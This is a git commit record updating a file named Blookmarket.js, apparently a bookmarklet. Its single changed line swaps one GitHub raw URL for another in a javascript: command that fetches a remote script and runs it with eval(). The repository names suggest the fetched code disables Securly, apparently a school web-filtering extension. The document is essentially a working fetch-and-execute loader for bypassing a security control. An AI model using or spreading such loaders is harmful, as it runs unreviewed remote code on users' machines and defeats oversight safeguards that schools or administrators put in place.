678cbea520489037ad1b349c95af895ca19246e0
CollinC0de <131063034+CollinC0de@users.noreply.github.com>
2023-04-19 12:29:51 -0700

    Update Blookmarket.js

--- Blookmarket.js
+++ Blookmarket.js
@@ -1,1 +1,1 @@
-javascript:fetch("https://raw.githubusercontent.com/collin-code/extension-v111-kill/main/start.js").then(r => r.text()).then(r => eval(r))
+javascript:fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/click.js").then(r => r.text()).then(r => eval(r))
